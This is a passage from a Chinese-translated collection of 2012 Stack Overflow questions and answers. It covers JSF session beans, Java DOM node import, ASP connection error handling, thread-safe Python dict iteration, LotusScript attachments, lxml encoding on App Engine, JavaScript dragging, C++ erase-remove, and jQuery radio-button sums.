        User user = userService.findBySessionId(session.getId());    
        connectedUsers.remove(user);
    }

    // ...
} 
```

另一种选择是将会话范围内的 bean 保留`User`为会话范围的托管 bean。然后，您可以使用`@PreDestroy`注释来标记应在会话被销毁时调用的方法。

```
@ManagedBean
@SessionScoped
public class User {

    @ManagedProperty("#{appBean}")
    private AppBean appBean;

    @PreDestroy
    public void destroy() {
        appBean.getConnectedUsers().remove(this);
    }

    // ...
} 
```

这具有额外的好处，即`User`在 EL 上下文中可用作`#{user}`.

# java - 不能将一个节点添加到另一个节点

> ID：10603358
> 
> 赞同：1
> 
> 时间：2012-05-15T14:52:11.597
> 
> 标签：java, android, xml, nodes

我有两个节点`node1`，`nod2`它们有不同的父文档，现在我想调用

`node1.appendChild(node2);`

此节点的功能，但我的应用程序崩溃，您可以在下面看到节点的所有者文档和 XML。

```
Document document1 = node1.getOwnerDocument();
Document document2 = node2.getOwnerDocument(); 
```

两个节点都有不同的所有者文档。`node1`所有者文件如下所述

```
<?xml version="1.0" encoding="UTF-8"?>
<ClientGetOTPSeedMessage>
    <UserID>userID</UserID>
    <DeviceInfo/>
</ClientGetOTPSeedMessage> 
```

和`node2`所有者文件如下：

```
<?xml version="1.0" encoding="UTF-8"?>
<Desc>
    <Desc1>First name</Desc1>
    <Desc2>Second name</Desc2>
</Desc> 
```

现在我想从节点中获取`</Desc>`节点`document2`并将其放入`<DeviceInfo/>`节点中，`document1`我该怎么做。我想说的是`node1`并`node2`保留我想要添加的节点，但是当我写的时候

```
node1.appendChild(node2); 
```

我的应用程序崩溃了，我想主要原因是他们有不同的所有者文件。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T15:24:28.493

正如您所说，应用程序崩溃的原因是不同的所有者文档（有关更多详细信息，请参阅[**this**](http://docs.oracle.com/javase/1.4.2/docs/api/org/w3c/dom/Node.html#appendChild%28org.w3c.dom.Node%29)）。要解决这个问题，您应该在 document1 中导入 node2，如下所示：

```
n2 = document1.importNode(n2, true); 
```

接着：

```
 n1.appendChild(n2); 
```

更多关于进口的信息在[**这里**](http://docs.oracle.com/javase/1.4.2/docs/api/org/w3c/dom/Document.html#importNode%28org.w3c.dom.Node,%20boolean%29)。

# sql-server-2008 - 如果 SQL 登录无效，请告诉我，但继续执行脚本...如何？

> ID：10603360
> 
> 赞同：1
> 
> 时间：2012-05-15T14:52:12.313
> 
> 标签：sql-server-2008, asp-classic

我希望我的脚本告诉我，如果使用自定义 response.write() 登录数据库失败，然后继续我的脚本。这可能吗？

说我有这个：

```
 set conn = server.createobject("adodb.connection")

      dsn = "Provider = sqloledb; Data Source = XX; Initial Catalog = XX; User Id = XX; Password = XX
      conn.connectiontimeout = 300
      conn.commandtimeout = 300

      if conn.state = 0 then
        conn.open dsn
      end if 
```

如果由于数据源、用户 ID 或密码错误而无法打开 conn，那么我希望它使用 response.write() 给我写一条消息，然后继续使用脚本的其余部分，否则它应该执行我的 sql -actions 然后继续 :)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T14:56:13.513

```
on error resume next
conn.open dsn
if err.number <> 0 then
   response.write "connection string was bad"
else
   ' other SQL activity here
end if
on error goto 0 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T14:56:49.477

您可以使用`On Error Resume Next`

这个页面讨论了处理连接错误，并给出了一个很好的例子来说明你在说什么。

[http://www.codeguru.com/csharp/.net/net_general/debugginganderrorhandling/article.php/c19557/ASP-and-the-Error-Handler.htm](http://www.codeguru.com/csharp/.net/net_general/debugginganderrorhandling/article.php/c19557/ASP-and-the-Error-Handler.htm)

# python - 可以迭代另一个线程正在修改的字典而不引发异常吗？

> ID：10603367
> 
> 赞同：6
> 
> 时间：2012-05-15T14:52:24.707
> 
> 标签：python, multithreading

我有一个由一个线程更新的字典，在另一个线程中我想迭代它的值。通常我会使用锁，但这段代码对性能非常关键，如果可能的话，我想避免这种情况。

我的案例的一个特点是我不关心迭代器的绝对正确性。如果它错过了迭代开始后删除的条目，或者捡起了之后添加的条目，那很好。我只要求它不会引发任何类型的“迭代期间更改的字典大小”异常。

鉴于对正确性的这种宽松约束，是否有一种有效的方法可以在不使用锁的情况下迭代字典？

注意：我知道这`keys()`在 Python 2.x 中是线程安全的，但由于这种行为在 3.x 中发生了变化，我想避免它。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T15:27:07.607

没有个人经验，但我前段时间读过：http: [//www.python.org/dev/peps/pep-3106/](http://www.python.org/dev/peps/pep-3106/)

> 这些操作是线程安全的，仅在以线程不安全的方式使用它们可能会导致异常但不会导致内部表示损坏的情况下。
> 
> 与 Python 2.x 中一样，在使用迭代器对其进行迭代时对 dict 进行变异具有未定义的效果，并且在大多数情况下会引发 RuntimeError 异常。（这类似于 Java 集合框架所做的保证。）

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-15T15:15:23.307

我会考虑使用足够长的锁来检索要迭代的值：

```
with lock:
    values = the_dict.values() # python 2
    # values = list(the_dict.values()) # python 3
for value in values:
    # do stuff 
```

或者，您可以在没有 lock 和 catch 的情况下尝试它`RuntimeError`，如果您得到一个，请尝试再次检索这些值。

[编辑] 下面根据 JF Sebastian 的建议稍作改写：

```
while True:
    try:
        values = list(the_dict.values())
        break
    except RuntimeError:
        pass 
```

我个人会选择锁。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-15T14:56:39.323

两件事情：

1.  将密钥转储到[队列](http://docs.python.org/library/queue.html)中并安全读取。
2.  性能关键代码可能不应该使用 Python 线程。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2019-03-21T10:53:35.813

有时，一个例子胜于言语。

数组迭代不是线程安全的，请参阅[Python 3.6 的实时示例](https://repl.it/@IvanErgunov/iteratedictthreadsafe-1)

# java - 在 Android 2.2.2 上忽略耳机

> ID：10603369
> 
> 赞同：2
> 
> 时间：2012-05-15T14:52:33.130
> 
> 标签：java, android

Android 2.2.2 中有没有办法覆盖耳机端口？

例如，能够告诉手机耳机已被移除的服务。`BroadcastReceiver`看起来它不能告诉手机任何事情，只是在事情发生变化时倾听。

我想这样做是因为我的 LG 手机认为即使没有耳机也有耳机，因此有必要在我的所有通话中使用免提电话。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T15:04:30.063

好吧，我用[讨论的链接回答这个问题，他们在 Droid X 上指出了许多要解决的问题](http://forums.androidcentral.com/motorola-droid-x/104919-x-thinks-headphones-always-plugged.html)。这不是与编程相关的答案，因为老实说，我认为这不是软件问题。[你可以在这里](http://forums.webosnation.com/webos-tips-information-resources/281437-stuck-headset-mode-permanent-easy-fix.html)、[这里](http://androidforums.com/motorola-triumph/518292-warning-headset-plug-going-bad.html)和[这里](http://androidforums.com/eris-support-troubleshooting/104669-eris-stuck-headset-mode-without-headset-plugged.html)找到更多有相同问题的人的讨论。

在建议的解决方案中：

*   重新插入耳机，然后将其拔出
*   也许里面有一块灰尘，试着在里面运行一个 q-tip
*   一个人通过恢复出厂设置“治愈”了它

# attachment - 需要使用 $FILE 附件，我无法访问它们

> ID：10603374
> 
> 赞同：7
> 
> 时间：2012-05-15T14:52:42.147
> 
> 标签：attachment, lotusscript, richtext

我有一封传入的电子邮件（mail-in db），其中包含一个 RichTextField，其中找到了“一些”附件。我还发现附件不是在 RTF 中，而是在文档中作为 $FILE。我正在尝试处理所有对象以将它们复制到另一封传出电子邮件。我可以使用下面的代码找到 $FILE。

```
 Dim rtiObject as NotesEmbeddedObject
 Dim rti_Email as NotesRichTextItem
 Dim obj_Email as NotesEmbeddedObject
 ForAll p in mailDoc.items
   if p.Name = "$FILE" then
     set obj_Email = mailDoc.GetAttachment(p.Values(0)) 'this will return the Name of the attachment (or file)
     set rtiObject = rti_Email.EmbedObject( EMBED_ATTACHMENT, "", obj_Email.Name) 'this is supposed to attach the file to the document's RTF
   End If
 End ForAll 
```

当此脚本运行时，它会找到 $FILE 文件并返回名称但不返回对象，我无法从那里对其进行任何处理。

我需要做什么才能从原始文档中获取附件/对象 ($FILE) 并将其附加到外发电子邮件中的 RTF？

我曾考虑将附件分离到网络，然后将其附加到外发电子邮件，然后从网络中删除附件，但这似乎不切实际。

有没有更好的方法来处理传入电子邮件中的这些 $FILE 类型的附件，这会使这更容易？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T15:36:21.263

尝试对象的`EmbeddedObjects`属性`NotesDocument`。像这样的东西：

```
Forall obj_Email in MailDoc.EmbeddedObjects
  If obj_Email.Type = EMBED_ATTACHMENT then
    Call obj_Email.Extract(sometempdirectory$ & obj_Email.Name)
    Call rti_Email.EmbedObject(EMBED_ATTACHMENT, "", sometempdirectory$ & obj_Email.Name)
End Forall 
```

如果您愿意，您也可以在[不分离的情况下进行操作。](http://searchdomino.techtarget.com/tip/Copy-attachments-in-LotusScript-without-detaching)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-02-10T20:52:56.327

您可以通过在 $File 字段前面加上 ~ 来访问它。

```
filename$ = mailDoc.~$File(0)
Set fileObj = mailDoc.GetAttachment(filename$)
Call fileObj.ExtractFile(filename$) 
```

# css - 我在哪里可以找到谷歌地图的样式表

> ID：10603376
> 
> 赞同：0
> 
> 时间：2012-05-15T14:52:46.293
> 
> 标签：css, google-maps, stylesheet

我在我的应用程序（在 iOS 中，但没关系）中使用带有 css 文件的 osm 映射来自定义它们的外观。我想让它们看起来像谷歌地图。我在哪里可以找到用于谷歌地图的 CSS 或类似的东西？我只需要知道主要高速公路和区域的颜色，所以如果你知道它们，请告诉我））提前谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T15:23:36.387

很确定你必须深入到谷歌地图 API 来提取你正在寻找的信息，我可能弄错了，但谷歌没有提供 CSS 方法来操纵其地图的外观和感觉。

或者

调出谷歌地图，截取屏幕截图，然后在您最喜欢的图形程序中使用滴管提取 HEX 值。

# google-app-engine - 在 Google App Engine 中解析 html 时出现 Unicode 问题

> ID：10603378
> 
> 赞同：1
> 
> 时间：2012-05-15T14:52:50.317
> 
> 标签：google-app-engine, unicode, lxml

我正在尝试使用 lxml 库解析网站的源代码以提取其中的文本。这是我的代码

```
import urllib2
from StringIO import StringIO
from lxml import html
from lxml.html.clean import Cleaner

cleaner = Cleaner(page_structure = False)
htmlsource = cleaner.clean_html(urllib2.urlopen("http://www.verycd.com/").read())
htmltree = html.parse(StringIO(htmlsource.decode("utf-8"))).getroot()
listnode = htmltree.xpath("*")
for node in listnode:
  print node.text_content().strip().encode("utf-8") 
```

当我在交互式控制台中运行代码时，结果如下所示（开发环境）

```
VeryCD电驴大全 - 分享互联网
用户名：
        密码：记住我 

        免费注册
         |
        忘记密码？

            首页 |
            商城 |
            专题 |
            乐园 |

            社区 |
            电驴 |
            网页游戏 |
            网址大全 
```

但是在生产环境中，所有的unicode字符都显示不正确

```
VeryCDçµé©´å¤§å¨ - åäº«äºèç½
ç¨æ·åï¼
        å¯ç ï¼è®°ä½æÂ 

        Â 
        åè´¹æ³¨å
         |
        å¿è®°å¯ç ï¼

            é¦é¡µ |
            åå |
            ä¸é¢ |
            ä¹å |

            ç¤¾åº |
            çµé©´ |
            ç½é¡µæ¸¸æ |
            ç½åå¤§å¨ 
```

知道如何解决这个问题吗？

**编辑**

好像我在这里发现了问题。我认为 Lxml 内置 GAE 有一些问题。如果我在解析 html 之前不使用清洁器，则输出很好。

```
# cleaner = Cleaner(page_structure = False)
# htmlsource = cleaner.clean_html(urllib2.urlopen("http://www.verycd.com/").read())
htmlsource = urllib2.urlopen("http://www.verycd.com/").read()
htmltree = html.parse(StringIO(htmlsource.decode("utf-8"))).getroot() 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T23:29:48.363

以下是处理文本的最基本规则：

1.  阅读后立即将文本解码为 un​​icode（您正在执行此操作）
2.  用 unicode 进行所有处理（你正在这样做）
3.  在输出之前对文本进行编码。你没有这样做。

在您的打印语句中添加一个编码，您应该没问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-17T06:05:21.463

**更新**：*此错误已在 App Engine 中修复，因此不再需要以下解决方法。*

我已经接受这是 lxml 或 App Engine 中的错误。但是您可以使用`lxml.etree.parse`and来解决它`lxml.etree.HTMLParser`（请注意，这`lxml.html`是对这两者的简单包装）：

```
import urllib2
from StringIO import StringIO
from lxml import etree
from lxml.html.clean import Cleaner

cleaner = Cleaner(page_structure = False)
htmlsource = cleaner.clean_html(urllib2.urlopen("http://www.verycd.com/").read())
htmlparser = etree.HTMLParser(encoding='utf-8')
htmltree = etree.parse(StringIO(htmlsource.decode("utf-8")),
                       parser=htmlparser).getroot()
listnode = htmltree.xpath("*")
for node in listnode:
  print node.text.strip().encode("utf-8") 
```

那是：

*   创建一个 HTMLParser 对象，显式设置`encoding='utf-8'`.
*   使用`etree.parse`代替`html.parse`; 传给. `parser=htmlparser`_`etree.parse`
*   使用`node.text`而不是`node.text_content()`.

这通过明确告诉 HTMLParser 使用 UTF-8 编码而不是让它猜测（它错误地猜测 Latin-1）来解决这个错误。

# javascript - Javascript中的拖放

> ID：10603379
> 
> 赞同：0
> 
> 时间：2012-05-15T14:52:51.620
> 
> 标签：javascript, html

我正在制作一个[便笺系统](http://code.google.com/p/sticky-note-system/downloads/detail?name=draggingpractice.htm&can=2&q=&surl=1&safe=active#makechanges)，并且我希望便笺可以用 javascript 拖动。[我在这个网站](http://luke.breuer.com/)上发现了一个拖放脚本，这对我来说非常有用。但我在便笺 div 内有一个“拖动条”，它应该是唯一可以拖动特定便笺的地方。我的脚本只拖动光标单击的内容，我希望它拖动“.dragbar” div 的父元素“.parent”。

现在，脚本设置为在单击 .parent 时拖动 .parent。如何在这段代码中选择“.dragbar”的父div，即“.parent”？

如果我让脚本选择 .dragbar，它只会在 .parent 内移动拖动条。注意：脚本是原始代码，只是第 87 行和第 95 行中的选择器名称由“drag”更改为“parent”。

```
<!DOCTYPE html>
<html>

    <head>
        <style type="text/css">
            .pagecontent {
                width:98%;
                height:96%;
                overflow:hidden;
                background:lightyellow;
                border:1px solid black;
                padding:10px;
            }
            .parent {
                position:relative;
                height:300px;
                width:300px;
                background-color:gray;
                border:1px solid black;
                float:left;
                margin:0 10px 0 0;
                overflow:auto;
            }
            .dragbar {
                height:50px;
                width:300px;
                background:lightgray;
                cursor:move;
                position:relative;
            }
        </style>
    </head>

    <body>
        <div class="pagecontent">
            <h1>Dragging Practice</h1>
            <h3>Drag and drop the parent div by using the child dragbar</h3>
            <pre id="debug">mouse up</pre>
            <div class="parent">
                <div class="dragbar">I am the Child, my class is .dragbar</div>I am the Parent, my class is
                .parent</div>
            <div class="parent">
                <div class="dragbar">I am the Child, my class is .dragbar</div>I am the Parent, my class is
                .parent</div>
            <script language="JavaScript" type="text/javascript">
                <!--
                // this is simply a shortcut for the eyes and fingers
                function $(id) {
                    return document.getElementById(id);
                }
                var _startX = 0; // mouse starting positions
                var _startY = 0;
                var _offsetX = 0; // current element offset
                var _offsetY = 0;
                var _dragElement; // needs to be passed from OnMouseDown to OnMouseMove
                var _oldZIndex = 0; // we temporarily increase the z-index during drag
                var _debug = $('debug'); // makes life easier
                InitDragDrop();

                function InitDragDrop() {
                    document.onmousedown = OnMouseDown;
                    document.onmouseup = OnMouseUp;
                }

                function OnMouseDown(e) {
                    // IE is retarded and doesn't pass the event object
                    if (e == null) e = window.event;
                    // IE uses srcElement, others use target
                    var target = e.target != null ? e.target : e.srcElement;
                    _debug.innerHTML = target.className == 'parent' //Selector
                    ?
                    'draggable element clicked' : 'NON-draggable element clicked';
                    // for IE, left click == 1
                    // for Firefox, left click == 0
                    if ((e.button == 1 && window.event != null || e.button == 0) && target.className == 'parent') //Selector
                    {
                        // grab the mouse position
                        _startX = e.clientX;
                        _startY = e.clientY;
                        // grab the clicked element's position
                        _offsetX = ExtractNumber(target.style.left);
                        _offsetY = ExtractNumber(target.style.top);
                        // bring the clicked element to the front while it is being dragged
                        _oldZIndex = target.style.zIndex;
                        target.style.zIndex = 10000;
                        // we need to access the element in OnMouseMove
                        _dragElement = target;
                        // tell our code to start moving the element with the mouse
                        document.onmousemove = OnMouseMove;
                        // cancel out any text selections
                        document.body.focus();
                        // prevent text selection in IE
                        document.onselectstart = function () {
                            return false;
                        };
                        // prevent IE from trying to drag an image
                        target.ondragstart = function () {
                            return false;
                        };
                        // prevent text selection (except IE)
                        return false;
                    }
                }

                function ExtractNumber(value) {
                    var n = parseInt(value);
                    return n == null || isNaN(n) ? 0 : n;
                }

                function OnMouseMove(e) {
                    if (e == null) var e = window.event;
                    // this is the actual "drag code"
                    _dragElement.style.left = (_offsetX + e.clientX - _startX) + 'px';
                    _dragElement.style.top = (_offsetY + e.clientY - _startY) + 'px';
                    _debug.innerHTML = '(' + _dragElement.style.left + ', ' + _dragElement.style.top + ')';
                }

                function OnMouseUp(e) {
                    if (_dragElement != null) {
                        _dragElement.style.zIndex = _oldZIndex;
                        // we're done with these events until the next OnMouseDown
                        document.onmousemove = null;
                        document.onselectstart = null;
                        _dragElement.ondragstart = null;
                        // this is how we know we're not dragging
                        _dragElement = null;
                        _debug.innerHTML = 'mouse up';
                    }
                }
                //-->
            </script>
        </div>
    </body>

</html> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T14:56:20.633

我建议您查看[jQuery UI 的 draggable](http://jqueryui.com/demos/draggable/)和[droppable](http://jqueryui.com/demos/droppable/)。这些无疑会比您链接的脚本更强大，并且您可以使用 jQuery 强大的选择器将元素设置为可拖动，并且只能在某些元素中放置。

# c++ - 删除两个集合中的元素的算法

> ID：10603382
> 
> 赞同：6
> 
> 时间：2012-05-15T14:53:00.947
> 
> 标签：c++, algorithm

我有一个 Visual Studio 2008 C++03 应用程序，其中有两个标准容器。我想从一个容器中删除另一个容器中存在的所有项目（集合的交集）。

像这样的东西：

```
std::vector< int > items = /* 1, 2, 3, 4, 5, 6, 7 */;
std::set< int > items_to_remove = /* 2, 4, 5*/;

std::some_algorithm( items.begin, items.end(), items_to_remove.begin(), items_to_remove.end() );

assert( items == /* 1, 3, 6, 7 */ ) 
```

是否有现有的算法或模式可以做到这一点，还是我需要自己推出？

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-15T14:59:27.153

尝试：

```
items.erase(
    std::remove_if(
        items.begin(), items.end()
      , std::bind1st(
            std::mem_fun( &std::set< int >::count )
          , items_to_remove
        )
    )
  , items.end()
); 
```

`std::remove(_if)`实际上并没有删除任何东西，因为它适用于迭代器而不是容器。它所做的是将要在范围末尾删除的元素重新排序，并将迭代器返回到容器的*新末尾*。然后，您调用`erase`以实际从容器中删除*新 end*之后的所有元素。

**更新：**如果我没记错的话，绑定到标准库组件的成员函数不是标准 C++，因为允许实现向函数添加默认参数。通过创建自己的函数或函数对象谓词来检查元素是否包含在要删除的项目集中，您会更安全。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-15T15:14:22.277

就个人而言，我更喜欢为此创建小助手（我大量重用）。

```
template <typename Container>
class InPredicate {
public:
    InPredicate(Container const& c): _c(c) {}

    template <typename U>
    bool operator()(U const& u) {
        return std::find(_c.begin(), _c.end(), u) != _c.end();
    }

private:
    Container const& _c;
};

// Typical builder for automatic type deduction
template <typename Container>
InPredicate<Container> in(Container const& c) {
    return InPredicate<Container>(c);
} 
```

这也有助于拥有一个真正的`erase_if`算法

```
template <typename Container, typename Predicate>
void erase_if(Container& c, Predicate p) {
    c.erase(std::remove_if(c.begin(), c.end(), p), c.end());
} 
```

接着：

```
erase_if(items, in(items_to_remove)); 
```

这是非常可读的:)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-05-15T15:56:52.690

另一种解决方案：

有标准提供的算法 set_difference 可用于此。但它需要额外的容器来保存结果。我个人更喜欢就地进行。

```
std::vector< int > items;
//say items = [1,2,3,4,5,6,7,8,9]

std::set<int>items_to_remove;
//say items_to_remove = <2,4,5>

std::vector<int>result(items.size()); //as this algorithm uses output 
                           //iterator not inserter iterator for result.

std::vector<int>::iterator new_end = std::set_difference(items.begin(), 
 items.end(),items_to_remove.begin(),items_to_remove.end(),result.begin());

result.erase(new_end,result.end()); // to erase unwanted elements at the 
                                    // end. 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-15T14:59:30.743

您可以为此`std::erase`结合使用。`std::remove`有一个称为*[Erase - Remove idiom](http://en.wikibooks.org/wiki/More_C++_Idioms/Erase-Remove)*的 C++ 习语，它将帮助您完成此操作。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-05-15T15:06:32.117

假设您有两组`A`和`B`，并且您想从 中删除`B`的交集 ，，`I`您的最终结果将是：（ 保持不变）`(A,B)``I = A^B``A`
`B' = B-I`

**完整理论： http:** [//math.comsci.us/sets/difference.html](http://math.comsci.us/sets/difference.html)

这很简单。

1.  创建和填充`A`和`B`
2.  创建第三个中间向量，`I`
3.  将内容复制`B`到`I`
4.  对于包含元素`a_j`的每个元素，搜索元素；如果在 中找到该元素，请将其删除`A``j``I``a_j``I`

最后，可以在此处找到删除单个元素的代码：
[如何从具有特定值的 stl 向量中删除项目？](https://stackoverflow.com/questions/39912/how-do-i-remove-an-item-from-a-stl-vector-with-a-certain-value)

搜索项目的代码在这里：
[如何查找项目是否存在于 std::vector 中？](https://stackoverflow.com/questions/571394/how-to-find-an-item-in-a-stdvector)

祝你好运！

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2015-05-24T11:53:33.837

这是一种更“动手”的就地方法，它不需要花哨的功能，也不需要对向量进行排序：

```
#include <vector>

template <class TYPE>
void remove_intersection(std::vector<TYPE> &items, const std::vector<TYPE> &items_to_remove)
{
    for (int i = 0; i < (int)items_to_remove.size(); i++) {
        for (int j = 0; j < (int)items.size(); j++) {
            if (items_to_remove[i] == items[j]) {
                items.erase(items.begin() + j);
                j--;//Roll back the iterator to prevent skipping over
            }
        }
    }
} 
```

如果您知道每个集合中的多重性是 1 （不是[multiset](https://en.wikipedia.org/wiki/Multiset)），那么您实际上可以用 a 替换该`j--;`行以`break;`获得更好的性能。

# jquery - Jquery如何在单选按钮中求和

> ID：10603383
> 
> 赞同：0
> 
> 时间：2012-05-15T14:53:01.293
> 
> 标签：jquery, radio-button, sum, jradiobutton

我正在尝试对单选按钮的许多值求和，但我的逻辑思维存在一些问题，

我把我的源代码[放在这里](http://jsfiddle.net/zEaw6/)是为了更好的可视化。

所以，例如，我有 product_price = 9.00 和一个收音机 = 2.00 和另一个收音机，radio2= 0.00

如果我检查收音机，总和将为 sum = product_price + radio，但问题是当我为 radio2 更改收音机时，它不能正常工作。

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T15:22:23.703

不知道我理解对不对......

但我想如果该选项有一些价格，您是否正在尝试求和...

如果是这样，您需要小心添加的值。

首先，创建一个名为 price 的全局变量。并将其设置为零。如果有必要，这将是您将添加的价格。默认配置，这个值会为零……所以设置为零。

当您更改选项时，首先从我们的总数中删除旧的加值。然后你检查这个选项是否有一些价值加上......如果有，你必须更新你的全局变量，并将这个新值添加到总计中。

查看代码以获取更多详细信息！

[http://jsfiddle.net/zEaw6/17/](http://jsfiddle.net/zEaw6/17/)

```
var price =0;
$('.rule input[type=radio]').change(function() {
var sum, total_current, currentPrice;
currentPrice = $(this).parent().parent().find('.price').text().replace('R$ ', '').replace('.', ',').replace(',', '.');
total_current = $('.item_price_total').text().replace('Total: R$ ', '').replace('.', ',').replace(',', '.');
sum = parseFloat(total_current) - parseFloat(price);
if (currentPrice) {
    price = currentPrice;
}
else{
    price = 0;
}
sum += parseFloat(price);
return $('.item_price_total').html(sum); 
```

});​</p>

亲切的问候！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T15:42:55.853

我认为最好不要使用 HTML 值来计算东西。您应该从您的服务器生成一些数据，例如：

```
<script>
var cart = {
    currency: '$',
    currentTotal: 9.85
}
var products = {
    10: {price: 4.5},
    11: {price: 5.8}
};
</script> 
```

这样您就可以使用您的商品 ID 轻松找到价格。

然后，使用标签的“for”属性更合乎逻辑，并且在我看来更漂亮：

```
<input id="choise_items_2__10" name="choise_items[2][]" type="radio" value="10">
<label class="radio" for="choise_items_2__10">Sanduíche 15 cm</label> 
```

最后，您应该使用全局价格，它更合乎逻辑，并且当您回顾代码时会更好。

与获取 jQuery 元素的方式相同，请不要犹豫添加步骤：

```
var $radioItem = $(this),
    $item = $radioItem.parent(),
    // we use the context argument 
    // same as $item.find('price')
    $priceItem = $('.price', $item); 
```

您可以在此处找到更多详细信息：http: [//jsfiddle.net/zEaw6/19/](http://jsfiddle.net/zEaw6/19/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-15T19:26:38.950

老实说。我认为这是最好的主意。

[http://jsfiddle.net/zEaw6/23/](http://jsfiddle.net/zEaw6/23/)

不要像 SuperSkunk 所说的那样获得用户文本的值 html。但取自 HTML。为您的 html 创建一个属性并获取从中添加的值。

代码在这里：

```
var price =9.95; //Valor base
$('.rule input[type=radio]').change(function() {
var checkeds = $(".rule").find("input[type=radio]:checked");
var plus = 0;
for(var i =0; i<checkeds.length;i++)
{
    plus += parseFloat($(checkeds[i]).attr("data-preco"));
}
//arrumando as casas decimais
var rounded = Math.round((plus+price)*100)/100;
return $('.item_price_total').html(rounded);
});​ 
```

“preco”是价格 “Valor base”是标准值 “arrumando as casa decimais”是排列小数位

# jquery - 如何用jquery替换标签？

> ID：10603384
> 
> 赞同：0
> 
> 时间：2012-05-15T14:53:09.277
> 
> 标签：jquery, html, dom

我有一个问题，我想替换下面的代码

```
<h2> Heading 1</h2>
<h2> Heading 2</h2> 
```

使用以下代码

```
<h2><span> Heading 1</span></h2>
<h2><span> Heading 2</span></h2> 
```

我想用 jquery 做到这一点。请帮我...

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-15T14:53:58.727

尝试使用`wrapInner`.

`$('h2').wrapInner('<span/>')`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T14:54:46.983

请花一些时间查看[jQuery api](http://api.jquery.com/)。[`wrapInner`](http://api.jquery.com/wrapinner)会成功的。

```
$('h2').wrapInner('<span>'); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-15T14:54:24.700

只需使用

```
$('h2').wrapInner('<span/>') 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-15T14:56:00.320

您可以使用[$.wrapInner执行此操作](http://api.jquery.com/wrapInner/)

```
$('h2').wrapInner('<span/>') 
```

# c# - 两个文件之间的二进制差异

> ID：10603387
> 
> 赞同：2
> 
> 时间：2012-05-15T14:53:20.450
> 
> 标签：c#, filesystems, binaryfiles

我正在我们的 C# 客户端应用程序中创建版本控制功能。我们的应用程序将数据存储在本地文件夹中，这些数据的大小范围可以从 10MB 到 4 GB。构建此功能的一个选项是在每次需要创建新版本时创建整个文件夹的副本。这将占用大量磁盘空间。

我想找到一个实用程序，它获取两个文件之间的二进制差异并将差异保存在增量文件中。然后我可以根据二进制差异重新创建所有整个文件夹。

例如，这类似于 Sql Server 中的增量备份。

该应用程序是使用 .NET C# 4.0 构建的，包括 Win 窗体和 WPF。我们使用 XML 序列化和 Sqlite 进行数据存储。

我正在寻找可以从 .net 应用程序中引用的 dll 库。第二个选择是使用命令行可执行文件。

# oauth-2.0 - 在桌面应用程序中使用 Google + API 和 LinkedIn API（不提示用户输入用户名密码）

> ID：10603390
> 
> 赞同：0
> 
> 时间：2012-05-15T14:53:53.550
> 
> 标签：oauth-2.0, linkedin, google-plus

我将创建一个页面，该页面将下载用户的活动并将其保存在 .xml 文件中，因为我的 iphone 应用程序需要处理它。问题是我无法提示用户输入登录密码......所以我想知道是否有一种永久密钥可以用来访问linkedin和gplus？谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T21:38:15.707

**谷歌+**

我可以回答您问题的 Google+ 部分 :)

您可以使用 REST API 的[活动列表方法](https://developers.google.com/+/api/latest/activities/list)访问用户的公共活动。要确定他们是谁，您需要通过[OAuth 流向](https://developers.google.com/+/api/)他们发送，在此期间他们将授权您知道他们在 Google+ 上的身份。

开始在 Google+ 中执行服务器端 OAuth 流程的最佳方法是获取其中一个[入门项目](https://developers.google.com/+/downloads/)并阅读随附的自述文件。这将为您提供一个工作项目，可以从中复制代码或进行开发。

我会包含一个代码示例来向您展示它是如何工作的，但我不知道什么最适合您的后端:)

**领英**

我远不是他们 API 的专家，但看起来使用[OAuth](http://developer.linkedin.com/documents/authentication)的流程会相似。

# iphone - 动画线的绘制

> ID：10603391
> 
> 赞同：7
> 
> 时间：2012-05-15T14:53:54.737
> 
> 标签：iphone, objective-c, ios, calayer, quartz-2d

我正在尝试通过以下方式为线条的绘制设置动画：

## 。H

```
CAShapeLayer *rootLayer;
CAShapeLayer *lineLayer;
CGMutablePathRef path; 
```

## .m

```
 path = CGPathCreateMutable();
 CGPathMoveToPoint(path, nil, self.frame.size.width/2-100, 260);
 CGPathAddLineToPoint(path, nil, self.frame.size.width/2+100.0, 260);    
 CGPathCloseSubpath(path);

 self.rootLayer = [CALayer layer];
 rootLayer.frame = self.bounds;
[self.layer addSublayer:rootLayer];

 self.lineLayer = [CAShapeLayer layer];
[lineLayer setPath:path];
[lineLayer setFillColor:[UIColor redColor].CGColor];
[lineLayer setStrokeColor:[UIColor blueColor].CGColor];
[lineLayer setLineWidth:1.5];
[lineLayer setFillRule:kCAFillRuleNonZero];
[rootLayer addSublayer:lineLayer];

[self performSelector:@selector(startTotalLine) withObject:nil afterDelay:1.5];

- (void)startTotalLine
{    
      CABasicAnimation *animation = [CABasicAnimation animationWithKeyPath:@"animatePath"];
      [animation setDuration:3.5];
